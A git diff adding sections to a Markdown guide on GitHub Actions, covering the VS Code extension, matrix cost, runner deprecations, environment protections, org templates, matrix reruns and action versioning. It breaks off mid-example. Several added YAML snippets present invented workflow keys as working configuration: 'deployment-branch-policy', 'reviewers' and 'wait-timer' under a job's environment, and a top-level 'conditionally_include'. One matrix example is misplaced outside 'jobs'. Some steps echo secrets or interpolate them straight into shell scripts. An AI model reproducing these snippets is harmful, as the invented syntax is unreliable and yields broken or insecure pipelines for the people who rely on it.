@@ -2,6 +2,13 @@
 
 - [GitHub Workflows: Complete Guide](#github-workflows-complete-guide)
   - [Introduction](#introduction)
+  - [GitHub Actions VS Code Extension \& Tooling](#github-actions-vs-code-extension--tooling)
+    - [Installing and Configuring the Extension](#installing-and-configuring-the-extension)
+    - [Features and Benefits](#features-and-benefits)
+    - [Using Context IntelliSense](#using-context-intellisense)
+    - [Validating Workflows Locally](#validating-workflows-locally)
+    - [Troubleshooting Extension Issues](#troubleshooting-extension-issues)
+    - [Best Practices for Local Development](#best-practices-for-local-development)
   - [Contextual Information in GitHub Workflows](#contextual-information-in-github-workflows)
     - [1. **github Context**](#1-github-context)
       - [Key Variables in `github` Context:](#key-variables-in-github-context)
@@ -65,24 +72,24 @@
     - [Overview of Trigger Events](#overview-of-trigger-events)
     - [1. **push** - Code Push Event](#1-push---code-push-event)
       - [Practical Example](#practical-example)
-    - [2. **pull\_request** - Pull Request Event](#2-pull_request---pull-request-event)
+    - [2. **pull_request** - Pull Request Event](#2-pull_request---pull-request-event)
       - [PR Event Types](#pr-event-types)
       - [Practical Example](#practical-example-1)
-    - [3. **pull\_request\_target** - PR Target Event](#3-pull_request_target---pr-target-event)
-    - [4. **workflow\_dispatch** - Manual Trigger](#4-workflow_dispatch---manual-trigger)
+    - [3. **pull_request_target** - PR Target Event](#3-pull_request_target---pr-target-event)
+    - [4. **workflow_dispatch** - Manual Trigger](#4-workflow_dispatch---manual-trigger)
       - [Input Types](#input-types)
     - [5. **schedule** - Scheduled Events (Cron)](#5-schedule---scheduled-events-cron)
       - [Cron Syntax Reference](#cron-syntax-reference)
       - [Common Cron Patterns](#common-cron-patterns)
-    - [6. **workflow\_run** - Trigger on Another Workflow](#6-workflow_run---trigger-on-another-workflow)
+    - [6. **workflow_run** - Trigger on Another Workflow](#6-workflow_run---trigger-on-another-workflow)
       - [Workflow Run Types](#workflow-run-types)
     - [7. **release** - Release Events](#7-release---release-events)
       - [Release Types](#release-types)
     - [8. **issues** - Issue Events](#8-issues---issue-events)
       - [Issue Types](#issue-types)
-    - [9. **issue\_comment** - Issue Comment Events](#9-issue_comment---issue-comment-events)
+    - [9. **issue_comment** - Issue Comment Events](#9-issue_comment---issue-comment-events)
     - [10. **discussion** - Discussion Events](#10-discussion---discussion-events)
-    - [11. **discussion\_comment** - Discussion Comment Events](#11-discussion_comment---discussion-comment-events)
+    - [11. **discussion_comment** - Discussion Comment Events](#11-discussion_comment---discussion-comment-events)
     - [12. **fork** - Repository Fork Event](#12-fork---repository-fork-event)
     - [13. **gollum** - Wiki Changes](#13-gollum---wiki-changes)
     - [14. **watch** - Star/Watch Event](#14-watch---starwatch-event)
@@ -90,14 +97,14 @@
     - [16. **delete** - Branch/Tag Deletion](#16-delete---branchtag-deletion)
     - [17. **public** - Repository Public Event](#17-public---repository-public-event)
     - [18. **push to protected branch** - Protected Branch Push](#18-push-to-protected-branch---protected-branch-push)
-    - [19. **repository\_dispatch** - External Trigger via API](#19-repository_dispatch---external-trigger-via-api)
-    - [20. **check\_run** - Check Run Events](#20-check_run---check-run-events)
-    - [21. **check\_suite** - Check Suite Events](#21-check_suite---check-suite-events)
-    - [22. **pull\_request\_review** - PR Review Events](#22-pull_request_review---pr-review-events)
-    - [23. **pull\_request\_review\_comment** - PR Review Comment Events](#23-pull_request_review_comment---pr-review-comment-events)
+    - [19. **repository_dispatch** - External Trigger via API](#19-repository_dispatch---external-trigger-via-api)
+    - [20. **check_run** - Check Run Events](#20-check_run---check-run-events)
+    - [21. **check_suite** - Check Suite Events](#21-check_suite---check-suite-events)
+    - [22. **pull_request_review** - PR Review Events](#22-pull_request_review---pr-review-events)
+    - [23. **pull_request_review_comment** - PR Review Comment Events](#23-pull_request_review_comment---pr-review-comment-events)
     - [24. **member** - Collaborator Events](#24-member---collaborator-events)
-    - [25. **team\_add** - Team Added Event](#25-team_add---team-added-event)
-    - [26. **push\_protected\_branch** - Protected Branch Push](#26-push_protected_branch---protected-branch-push)
+    - [25. **team_add** - Team Added Event](#25-team_add---team-added-event)
+    - [26. **push_protected_branch** - Protected Branch Push](#26-push_protected_branch---protected-branch-push)
     - [Complete Example: All Event Types](#complete-example-all-event-types)
     - [Event Availability Summary](#event-availability-summary)
   - [Creating and Using Custom Environment Variables](#creating-and-using-custom-environment-variables)
@@ -115,15 +122,15 @@
       - [Using runner Context](#using-runner-context)
       - [Using Matrix Context](#using-matrix-context)
     - [6. **Creating Dynamic Environment Variables from Step Outputs**](#6-creating-dynamic-environment-variables-from-step-outputs)
-      - [Using GITHUB\_OUTPUT](#using-github_output)
+      - [Using GITHUB_OUTPUT](#using-github_output)
       - [Multiline Environment Variables](#multiline-environment-variables)
     - [7. **Using environment Variables from Previous Jobs**](#7-using-environment-variables-from-previous-jobs)
     - [8. **Environment Variables with Default Values**](#8-environment-variables-with-default-values)
       - [Using Variable Expansion](#using-variable-expansion)
     - [9. **Special Environment Variables**](#9-special-environment-variables)
       - [Special GitHub Environment Variables](#special-github-environment-variables)
-      - [GITHUB\_STEP\_SUMMARY — Job Summary Reports](#github_step_summary--job-summary-reports)
-      - [RUNNER\_TOOL\_CACHE — Preinstalled Software](#runner_tool_cache--preinstalled-software)
+      - [GITHUB_STEP_SUMMARY — Job Summary Reports](#github_step_summary--job-summary-reports)
+      - [RUNNER_TOOL_CACHE — Preinstalled Software](#runner_tool_cache--preinstalled-software)
     - [10. **Best Practices for Environment Variables**](#10-best-practices-for-environment-variables)
       - [✓ Do's](#-dos)
       - [✗ Don'ts](#-donts)
@@ -270,8 +277,8 @@
       - [Accessing Workflow Logs](#accessing-workflow-logs)
       - [Environment Information in Logs](#environment-information-in-logs)
     - [2. **Enabling Debug Logging**](#2-enabling-debug-logging)
-      - [RUNNER\_DEBUG Variable](#runner_debug-variable)
-      - [Output with RUNNER\_DEBUG](#output-with-runner_debug)
+      - [RUNNER_DEBUG Variable](#runner_debug-variable)
+      - [Output with RUNNER_DEBUG](#output-with-runner_debug)
     - [3. **Using Workflow Commands**](#3-using-workflow-commands)
       - [Add Diagnostic Markers](#add-diagnostic-markers)
       - [Output Variables for Debugging](#output-variables-for-debugging)
@@ -304,7 +311,7 @@
       - [Query Parameters:](#query-parameters)
     - [4. **Get Workflow Run Details**](#4-get-workflow-run-details)
       - [Complete Python Example](#complete-python-example)
-    - [5. **Trigger Workflow (workflow\_dispatch)**](#5-trigger-workflow-workflow_dispatch)
+    - [5. **Trigger Workflow (workflow_dispatch)**](#5-trigger-workflow-workflow_dispatch)
       - [Workflow with Inputs](#workflow-with-inputs)
       - [Python Example: Trigger Deployment](#python-example-trigger-deployment)
     - [6. **Re-run Workflow**](#6-re-run-workflow)
@@ -375,10 +382,16 @@
     - [6. **Secrets and Variables at Organization, Repository, and Environment Levels**](#6-secrets-and-variables-at-organization-repository-and-environment-levels)
   - [Security and Optimization](#security-and-optimization)
     - [Overview](#overview-1)
-    - [1. **GITHUB\_TOKEN — Lifecycle, Permissions, and Granular Scopes**](#1-github_token--lifecycle-permissions-and-granular-scopes)
+    - [1. **GITHUB_TOKEN — Lifecycle, Permissions, and Granular Scopes**](#1-github_token--lifecycle-permissions-and-granular-scopes)
     - [2. **OIDC Token for Cloud Federation**](#2-oidc-token-for-cloud-federation)
+      - [GCP Workload Identity Federation Example](#gcp-workload-identity-federation-example)
+      - [Azure Federated Credentials Setup (Detailed)](#azure-federated-credentials-setup-detailed)
+      - [OIDC Subject Claim (sub) Specification](#oidc-subject-claim-sub-specification)
     - [3. **Pinning Actions to Full Commit SHAs**](#3-pinning-actions-to-full-commit-shas)
     - [4. **Script Injection Mitigation**](#4-script-injection-mitigation)
+      - [Shell-Specific Quoting Rules](#shell-specific-quoting-rules)
+      - [Advanced Pattern: Sanitization Functions](#advanced-pattern-sanitization-functions)
+      - [Common Injection Payloads to Test Against](#common-injection-payloads-to-test-against)
     - [5. **Identifying Trustworthy Marketplace Actions**](#5-identifying-trustworthy-marketplace-actions)
     - [6. **Artifact Attestations and SLSA Provenance**](#6-artifact-attestations-and-slsa-provenance)
     - [7. **Dependency Policy: Caching and Artifact Retention**](#7-dependency-policy-caching-and-artifact-retention)
@@ -439,6 +452,104 @@
 ## Introduction
 
 GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. Workflows are automated processes defined in YAML files that run jobs in response to events in your GitHub repository.
+
+---
+
+## GitHub Actions VS Code Extension & Tooling
+
+The **GitHub Actions VS Code extension** and native YAML schema validation provide rich developer experience for authoring and validating workflows locally before committing.
+
+### Installing and Configuring the Extension
+
+**Installation:**
+
+1. Open VS Code Extensions (Ctrl/Cmd+Shift+X)
+2. Search for "GitHub Actions" (publisher: GitHub)
+3. Click Install
+
+**Verification:**
+
+```bash
+# The extension should appear in your installed extensions list
+code --list-extensions | grep -i github
+```
+
+### Features and Benefits
+
+| Feature                    | What it provides                                                         |
+| -------------------------- | ------------------------------------------------------------------------ |
+| **YAML schema validation** | Real-time validation of workflow file structure against GitHub's schema  |
+| **Context IntelliSense**   | Auto-complete for `${{ github.* }}`, `secrets.*`, `env.*`, etc.          |
+| **Action metadata lookup** | Hover over an action to see its inputs, outputs, and latest version      |
+| **Expression evaluation**  | Preview what expressions evaluate to at parse time                       |
+| **Error highlighting**     | Immediate feedback on syntax errors, invalid contexts, permission issues |
+| **Breadcrumbs navigation** | Easy navigation within large workflow files                              |
+
+### Using Context IntelliSense
+
+**Example: Typing `${{ ` triggers context suggestions:**
+
+```yaml
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo ${{ github.actor }} # IntelliSense shows available contexts
+```
+
+Available contexts include:
+
+- `github.*` — workflow, repository, event info
+- `secrets.*` — defined secrets (names only, values not shown)
+- `env.*` — workflow and job env vars
+- `inputs.*` — workflow_dispatch or workflow_call inputs
+- `matrix.*` — matrix strategy values
+- `vars.*` — repository and organization variables
+
+### Validating Workflows Locally
+
+**The extension validates against GitHub's official schema**, which includes:
+
+- Valid trigger events and their filters
+- Required and optional job properties
+- Valid permission scopes
+- Action reference syntax (including SHA pinning)
+- Context availability at each workflow key
+
+**Red squiggly lines indicate problems** — hover to see details:
+
+```yaml
+- uses: actions/checkout@main # ⚠️ Extension may warn if SHA pinning is preferred
+  with:
+    invalid-input: value # ❌ Extension highlights invalid input
+```
+
+### Troubleshooting Extension Issues
+
+**Extension not working?**
+
+1. Ensure `YAML` extension is also installed (often bundled dependency)
+2. Verify the workflow file is in `.github/workflows/` or workflow syntax is enabled
+3. Check VS Code setting: `"yaml.schemas"` should include GitHub Actions schema
+4. Reload VS Code window: Ctrl/Cmd+Shift+P → "Developer: Reload Window"
+
+**To manually add GitHub Actions schema:**
+
+```json
+// In your VS Code settings.json
+{
+  "yaml.schemas": {
+    "https://json.schemastore.org/github-workflow.json": ".github/workflows/*.yml"
+  }
+}
+```
+
+### Best Practices for Local Development
+
+- **Commit `.github/workflows/` frequently** — catch issues early via CI
+- **Use extension validation before pushing** — reduces failed workflow runs
+- **Reference action documentation** — extension shows inputs; always read the action's README for context-specific requirements
+- **Test workflow_dispatch inputs** — validate input types and defaults in the extension before deploying to team
 
 ---
 
@@ -1187,6 +1298,121 @@ jobs:
     steps:
       - run: echo "Building ${{ matrix.project }} with config ${{ matrix.config }}"
 ```
+
+**Matrix Cost Optimization and Deprecation Migration:**
+
+Matrix builds multiply the number of jobs, increasing costs. For example, a 3×4 matrix (3 OS × 4 Node versions) = 12 parallel jobs.
+
+**Cost Estimation:**
+
+```yaml
+# ❌ EXPENSIVE: 3 OS × 4 Node × 2 architectures = 24 jobs
+strategy:
+  matrix:
+    os: [ubuntu-latest, windows-latest, macos-latest]
+    node: [18, 19, 20, 21]
+    arch: [x64, arm64]
+
+# ✅ OPTIMIZED: ~8 jobs (exclude expensive combinations, reduce scope)
+strategy:
+  fail-fast: false
+  max-parallel: 3  # Limit parallel jobs to reduce per-run cost
+  matrix:
+    include:
+      # Test critical combinations only
+      - os: ubuntu-latest
+        node: 18
+      - os: ubuntu-latest
+        node: 21
+      - os: windows-latest
+        node: 20
+      - os: macos-latest
+        node: 20
+      # Nightly extended matrix (use schedule trigger)
+```
+
+**GitHub-Hosted Runner Costs (approximate, 2026):**
+
+- `ubuntu-latest`: Base cost (included in Actions minutes)
+- `windows-latest`: 2x cost multiplier
+- `macos-latest`: 10x cost multiplier
+
+**Strategy examples by cost sensitivity:**
+
+```yaml
+# For open-source projects (cost-sensitive)
+strategy:
+  matrix:
+    node: [18, 21]  # Only LTS + latest versions
+    # Skip rare platforms, just test on ubuntu-latest
+runs-on: ubuntu-latest
+
+# For paid organizations (comprehensive testing)
+strategy:
+  fail-fast: false
+  matrix:
+    os: [ubuntu-latest, windows-latest, macos-latest]
+    node: [18, 19, 20, 21]
+
+# For enterprise (selective by branch)
+strategy:
+  matrix:
+    include:
+      # PR checks: minimal testing
+      - { os: ubuntu-latest, node: 20 }
+      # Main branch: comprehensive testing
+      - { os: ubuntu-latest, node: 18 }
+      - { os: ubuntu-latest, node: 21 }
+      - { os: windows-latest, node: 20 }
+      - { os: macos-latest, node: 20 }
+conditionally_include: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}
+```
+
+**Runner Image Deprecation: Ubuntu 20.04 and windows-latest:**
+
+**Ubuntu 20.04 Deprecation (as of March 2024):**
+
+- `ubuntu-20.04` is no longer supported on GitHub-hosted runners
+- **Action required**: Migrate workflows to `ubuntu-22.04` or `ubuntu-latest` (currently 24.04)
+
+```yaml
+# ❌ WILL FAIL
+jobs:
+  build:
+    runs-on: ubuntu-20.04
+
+# ✅ MIGRATE TO
+jobs:
+  build:
+    runs-on: ubuntu-22.04  # or ubuntu-latest
+```
+
+**windows-latest Transition (Windows Server 2025):**
+
+- As of March 2025, `windows-latest` points to Windows Server 2025
+- `windows-2022` remains available
+- Test for compatibility:
+  - PowerShell version changes (7.4+ vs 7.1)
+  - .NET runtime differences
+  - Build tool versions
+
+```yaml
+strategy:
+  matrix:
+    os:
+      - ubuntu-latest # Currently 24.04
+      - windows-2022 # Stable, known versions
+      - windows-latest # Windows Server 2025 (test for compat)
+      - macos-latest # Currently macOS 14
+```
+
+**Deprecation Action Checklist:**
+
+- [ ] Audit all workflows for `ubuntu-20.04` references
+- [ ] Replace with `ubuntu-22.04` or `ubuntu-latest`
+- [ ] Test `windows-latest` against Windows Server 2025 breaking changes
+- [ ] Pin specific runner versions for production workflows: `ubuntu-22.04`, `windows-2022`, `macos-13`
+- [ ] Update CI/CD docs with current runner image versions
 
 ##### **if**
 
@@ -4131,6 +4357,235 @@ View in GitHub UI:
 
 ---
 
+### 9. **Advanced Environment Protections**
+
+#### Deployment Branches and Restrictions
+
+Control which branches can deploy to specific environments:
+
+```yaml
+environment:
+  name: production
+  deployment-branch-policy:
+    protected-branches: true # Only protected branches can deploy
+    custom-deployment-branch-policies:
+      - main
+      - release/*
+```
+
+**Branch Policy Matrix:**
+
+| Setting                             | Effect                              | Use Case                           |
+| ----------------------------------- | ----------------------------------- | ---------------------------------- |
+| `protected-branches: true`          | Only branches with protection rules | Enterprise: compliance requirement |
+| `custom-branches: [main, release/]` | Only specific branches/patterns     | Controlled rollout strategy        |
+| No filter                           | Any branch                          | Development/staging environments   |
+
+#### Required Reviewers with Role-Based Access
+
+```yaml
+environment:
+  name: production
+  reviewers:
+    - security-team
+    - platform-leads
+  deployment-branch-policy:
+    protected-branches: true
+```
+
+**Reviewer Access Control (in Settings):**
+
+- **All users**: Anyone in org can review
+- **Specific organizations**: External org teams
+- **Specific users**: Named individuals with elevated credentials
+- **Specific teams**: Role-based (engineering, devops, security)
+
+#### Custom Deployment Scripts with Approval Gates
+
+Combine deployment protection rules with custom scripts for maximum control:
+
+```yaml
+name: Controlled Deployment
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  pre-deployment-checks:
+    runs-on: ubuntu-latest
+    outputs:
+      business-hours: ${{ steps.check-time.outputs.is-business-hours }}
+      approval-required: ${{ steps.check-approval.outputs.required }}
+    steps:
+      - id: check-time
+        run: |
+          HOUR=$(date +%H)
+          if [ $HOUR -ge 9 ] && [ $HOUR -le 17 ]; then
+            echo "is-business-hours=true" >> $GITHUB_OUTPUT
+          else
+            echo "is-business-hours=false" >> $GITHUB_OUTPUT
+          fi
+
+      - id: check-approval
+        run: |
+          # Check if risky files changed
+          if git diff origin/main HEAD --name-only | grep -E '^(src/auth|src/payment)'; then
+            echo "required=true" >> $GITHUB_OUTPUT
+          else
+            echo "required=false" >> $GITHUB_OUTPUT
+          fi
+
+  deploy:
+    needs: pre-deployment-checks
+    runs-on: ubuntu-latest
+    environment:
+      name: ${{ needs.pre-deployment-checks.outputs.approval-required == 'true' && 'production-with-approval' || 'production' }}
+      url: https://example.com
+    steps:
+      - uses: actions/checkout@v3
+      - name: Deploy
+        run: bash deploy.sh
+```
+
+#### Approval Timeout and Wait Timers
+
+Set how long reviewers have to approve:
+
+```yaml
+environment:
+  name: production
+  # Settings > Environments > Wait timer
+  wait-timer: 24 # 24-hour window for approvals
+  deployment-branch-policy:
+    protected-branches: true
+  reviewers:
+    - senior-engineers
+```
+
+**Deployment Timeout Behavior:**
+
+- Approval timeout = workflow waits max 24 hours for reviewer decision
+- After timeout: deployment **queued** (doesn't fail), reviewer can still approve
+- Re-run: manual re-run resets timer and restarts job
+
+#### Environment Secrets with Restricted Scope
+
+Secrets at environment level have stricter access controls:
+
+```yaml
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      # Secrets defined here automatically scoped to:
+      # - This environment only
+      # - This repository only
+      # - Only accessible during deployments to this env
+    steps:
+      - run: echo ${{ secrets.PROD_API_KEY }} # Only available in production environment
+```
+
+**Multi-Environment Secret Strategy:**
+
+```yaml
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: ${{ matrix.environment }}
+    strategy:
+      matrix:
+        environment: [staging, production]
+    steps:
+      - name: Deploy to ${{ matrix.environment }}
+        run: |
+          export API_KEY=${{ secrets.API_KEY }}
+          bash deploy.sh
+      # Each environment has its own API_KEY secret
+      # GitHub automatically injects the right one based on environment
+```
+
+#### Deployment Status Checks and CI Requirements
+
+Require CI checks to pass before deployment:
+
+```yaml
+# In Settings > Branch Protection:
+# - Require status checks to pass
+# - Require branches to be up to date before merging
+# - Dismiss stale pull request approvals
+
+# In workflow:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - run: npm test
+
+  deploy:
+    needs: test # Implicit dependency
+    runs-on: ubuntu-latest
+    environment: production
+    if: success() # Fail fast if tests don't pass
+    steps:
+      - run: bash deploy.sh
+```
+
+#### Monitoring Sensitive Deployments
+
+Create audit trail for all deployments:
+
+```yaml
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      url: https://example.com
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Log Deployment Metadata
+        run: |
+          cat > /tmp/deployment.log <<EOF
+          Deployment Audit Log
+          ====================
+          Timestamp: $(date -u)
+          Repository: $GITHUB_REPOSITORY
+          Branch: $GITHUB_REF_NAME
+          Commit SHA: $GITHUB_SHA
+          Commit Message: $(git log -1 --pretty=%B)
+          Triggered By: $GITHUB_ACTOR
+          Workflow: $GITHUB_WORKFLOW
+          Run ID: $GITHUB_RUN_ID
+          EOF
+          cat /tmp/deployment.log
+
+      - name: Upload Deployment Log
+        uses: actions/upload-artifact@v3
+        with:
+          name: deployment-logs
+          path: /tmp/deployment.log
+          retention-days: 90
+
+      - name: Notify Audit System
+        run: |
+          curl -X POST https://audit.example.com/deployments \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer ${{ secrets.AUDIT_TOKEN }}" \
+            -d '{
+              "repository": "${{ github.repository }}",
+              "branch": "${{ github.ref_name }}",
+              "sha": "${{ github.sha }}",
+              "actor": "${{ github.actor }}",
+              "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
+            }'
+```
+
+---
+
 ## GitHub Workflow Artifacts
 
 Artifacts are files or collections of files created during a workflow run that you can use to share data between jobs in a workflow or store the outputs from individual jobs. Artifacts are essential for preserving build outputs, test results, logs, and other important data generated during your CI/CD pipeline.
@@ -5538,6 +5993,112 @@ jobs:
 
 > For **public** repositories, starter workflows are visible to all GitHub users. For organization repositories, they are visible only to members with repository access.
 
+#### Organizational Workflow Templates vs GitHub-Provided Starter Workflows
+
+**GitHub-Provided Starter Workflows** (on Marketplace):
+
+- **Location**: Managed by GitHub, accessible from any repository's Actions tab
+- **Visibility**: Public marketplace visible to all users
+- **Best for**: Language/framework-specific scaffolding (Node.js, Python, Go, Rails, etc.)
+- **Ownership**: Maintained by GitHub's community
+
+**Organizational Workflow Templates** (private to your org):
+
+- **Location**: Stored in `{org}/.github` repo under `workflow-templates/`
+- **Visibility**: Private to organization members with access to `.github` repo
+- **Best for**: Organization-specific standards, security policies, internal tooling
+- **Ownership**: Your organization maintains
+
+**Creating Private Org Templates - Complete Setup:**
+
+1. **Create or update the `.github` repository** in your organization
+2. **Add template files** in `.github/workflow-templates/`:
+
+```plaintext
+.github/
+└── workflow-templates/
+    ├── security-scan.properties.json
+    ├── security-scan.yml
+    ├── deploy-prod.properties.json
+    └── deploy-prod.yml
+```
+
+3. **Template metadata** (`security-scan.properties.json`):
+
+```json
+{
+  "name": "Security Scanning Pipeline",
+  "description": "Run CodeQL and SAST for all branches",
+  "iconName": "octicon shield",
+  "categories": ["Security", "CI"],
+  "filePatterns": []
+}
+```
+
+4. **Template workflow with organization placeholders** (`security-scan.yml`):
+
+```yaml
+name: Security Scanning
+
+on:
+  push:
+    branches: [$default-branch]
+  pull_request:
+    branches: [$default-branch]
+
+env:
+  # Organization-wide defaults
+  REGISTRY: ghcr.io
+  IMAGE_NAME: ${{ github.repository }}
+
+jobs:
+  security-scan:
+    runs-on: ubuntu-latest
+    permissions:
+      # Org-standard permissions
+      security-events: write
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Initialize CodeQL
+        uses: github/codeql-action/init@v2
+        with:
+          languages: javascript # Customize per repo on copy
+
+      - name: Perform CodeQL Analysis
+        uses: github/codeql-action/analyze@v2
+
+      - name: Upload SARIF results
+        uses: github/codeql-action/upload-sarif@v2
+        with:
+          sarif-file: results.sarif
+```
+
+**Discovering and Using Org Templates:**
+
+1. In any organization repository, navigate to Actions → **"New workflow"**
+2. Look for your **organization's templates** section (before GitHub's marketplace templates)
+3. Click on a template to create a copy
+4. The template is copied into `.github/workflows/` of that repository (fully independent)
+5. Customize as needed
+
+**Sync Pattern for Org Templates** (if you want changes to propagate):
+
+Since templates are copied, they don't auto-update. If you need central control, use reusable workflows instead:
+
+```yaml
+# Option A: Use reusable workflow (stays linked)
+name: Call Our Security Workflow
+
+on:
+  push:
+
+jobs:
+  security:
+    uses: {org}/.github/.github/workflows/security-reusable.yml@main
+```
+
 #### Disabling vs Deleting a Workflow
 
 | Action      | Effect                                                                                       | When to use                                            |
@@ -5850,6 +6411,152 @@ jobs:
           if [ $ELAPSED -gt 540 ]; then
             echo "::warning::Task approaching timeout (9 minutes)"
           fi
+```
+
+#### Scenario 4: Matrix Selective Reruns
+
+When a matrix job fails, you may want to rerun only the specific failing combinations instead of all matrix jobs.
+
+**Understanding Matrix Job Names:**
+
+Matrix jobs are labelled by their axes combination. For a matrix with `os: [ubuntu, windows]` and `node: [18, 20]`:
+
+```yaml
+strategy:
+  matrix:
+    os: [ubuntu-latest, windows-latest]
+    node: [18, 20]
+
+jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    steps:
+      - run: npm test
+```
+
+Generated job names will be:
+
+- `test (ubuntu-latest, 18)`
+- `test (ubuntu-latest, 20)`
+- `test (windows-latest, 18)`
+- `test (windows-latest, 20)`
+
+**Selective Rerun via UI:**
+
+```
+1. Go to "Actions" tab
+2. Click workflow run that had failures
+3. Under "Jobs" section, each matrix combination is listed separately
+4. Click "Re-run jobs" → "Re-run failed jobs" only reruns failed combinations
+5. Or click "..." on specific job → "Re-run job [combination]"
+```
+
+**Selective Rerun via GitHub CLI:**
+
+```bash
+# Get workflow run ID
+gh run list --workflow=test.yml --limit=5
+
+# Rerun only failed jobs (of the entire matrix)
+gh run rerun RUNID --failed
+
+# Rerun a specific job (need job ID from workflow)
+gh run rerun RUNID --job JOBID
+```
+
+**Matrix Selective Rerun Example Workflow:**
+
+```yaml
+name: Multi-Platform Tests
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  test:
+    name: test (${{ matrix.os }}, Node ${{ matrix.node }})
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false # Let all matrix jobs run even if one fails
+      matrix:
+        os: [ubuntu-latest, windows-latest, macos-latest]
+        node: [18, 20, 21]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node }}
+
+      - name: Run Tests
+        run: npm test
+
+      - name: Generate Report
+        if: failure()
+        run: |
+          echo "Test failed on ${{ matrix.os }} with Node ${{ matrix.node }}"
+          # Save failure details for reference
+          echo "OS: ${{ matrix.os }}" >> test-report.txt
+          echo "Node: ${{ matrix.node }}" >> test-report.txt
+
+      - name: Upload Test Report
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: test-report-${{ matrix.os }}-node${{ matrix.node }}
+          path: test-report.txt
+```
+
+**REST API for Selective Rerun:**
+
+```bash
+# Rerun all failed jobs in a workflow run
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/runs/RUNID/rerun-failed-jobs
+
+# Get all jobs in a workflow run (to find job IDs)
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/runs/RUNID/jobs \
+  | jq '.jobs[] | {id, name, status, conclusion}'
+
+# Rerun a specific job
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/jobs/JOBID/rerun
+```
+
+**Best Practices for Matrix Debugging:**
+
+1. **Use descriptive job names** - Include matrix values in the job name for clarity
+2. **Set `fail-fast: false`** - Let all combinations run to see all failures at once
+3. **Use artifacts for debug info** - Upload logs specific to each matrix combination
+4. **Group output** - Use `::group::` to organize per-combination logs
+5. **Conditional debugging steps** - Add debug steps only when tests fail
+
+```yaml
+jobs:
+  test:
+    name: test (${{ matrix.os }}, ${{ matrix.node }})
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+        node: [18, 20]
+    steps:
+      - run: npm test
+
+      - name: Debug Info (on failure)
+        if: failure()
+        run: |
+          echo "::group::Failure Details"
+          echo "Platform: ${{ matrix.os }}"
+          echo "Node Version: ${{ matrix.node }}"
+          npm --version
+          npm ls
+          echo "::endgroup::"
 ```
 
 ### 5. **Performance and Profiling**
@@ -7627,6 +8334,413 @@ git tag -fa v1 -m "Update v1 to latest"
 git push origin v1 --force
 ````
 
+### 4. **Action Versioning & Release Strategies**
+
+#### Semantic Versioning for Actions
+
+GitHub Actions uses **semantic versioning** (MAJOR.MINOR.PATCH):
+
+```
+v1.0.0 → v1.1.0 → v1.2.0 (patch/minor bumps)
+v1.x.x → v2.0.0 (major version bump)
+```
+
+**Release Guidelines:**
+
+| Version           | When to Release        | Example Change                            | Backward Compatible |
+| ----------------- | ---------------------- | ----------------------------------------- | ------------------- |
+| **v1.0.0→v1.0.1** | Bug fixes              | Fix typo in logging                       | ✅ Yes              |
+| **v1.0.0→v1.1.0** | New features           | Add optional input parameter              | ✅ Yes              |
+| **v1.x.x→v2.0.0** | Breaking changes       | Rename required input, remove old feature | ❌ No               |
+| **v1→latest**     | Major version tracking | Keep v1 tag pointing to latest v1.x.x     | ✅ Yes              |
+
+#### Major Version Tag Strategy
+
+For optimal user experience, maintain a **major version tag** (e.g., `v1`, `v2`) that points to the latest stable minor/patch version:
+
+```bash
+# Release v1.1.0 (new feature)
+git tag -a v1.1.0 -m "Add new parameter for cleanup"
+git push origin v1.1.0
+
+# Update v1 tag to point to v1.1.0
+git tag -fa v1 -m "Latest v1.x release"
+git push origin v1 --force-with-lease
+
+# Users with v1 tag automatically get the improvement
+# - GitHub Actions caches v1.0.0
+# - New workflows using v1 get v1.1.0
+# - Old references to v1 won't break
+```
+
+**Action Consumer Benefits:**
+
+```yaml
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      # Gets latest v1.x.x (currently v1.2.5)
+      - uses: org/action@v1
+
+      # Gets specific version (never changes)
+      - uses: org/action@v1.2.0
+
+      # Gets development version (for testing)
+      - uses: org/action@main
+```
+
+#### Release Checklist
+
+Before publishing a new version:
+
+- [ ] **Test thoroughly** on target platforms (Linux, Windows, macOS if applicable)
+- [ ] **Update action.yml**: Bump version in description/comments
+- [ ] **Update README.md**: Document new features or breaking changes
+- [ ] **Create CHANGELOG.md entry**: List breaking changes, new features, bug fixes
+- [ ] **Merge to main**: All changes should be in main branch before tagging
+- [ ] **Create git tag**: `git tag -a vX.Y.Z -m "Release message"`
+- [ ] **Push tag**: `git push origin vX.Y.Z`
+- [ ] **Update major version tag** (if stable): `git tag -fa vX -m "Latest"` and `git push origin vX --force-with-lease`
+- [ ] **Create GitHub Release**: Link to CHANGELOG, include migration notes for major versions
+- [ ] **Verify on Marketplace**: Check action display and documentation render correctly
+
+#### Deprecation and Migration Guide
+
+When deprecating or making breaking changes:
+
+```yaml
+action.yml:
+  description: |
+    ↓↓↓ BREAKING CHANGE in v2.0.0 ↓↓↓
+    - Input 'docker-user' renamed to 'registry-user'
+    - Input 'docker-tag' renamed to 'image-tag'
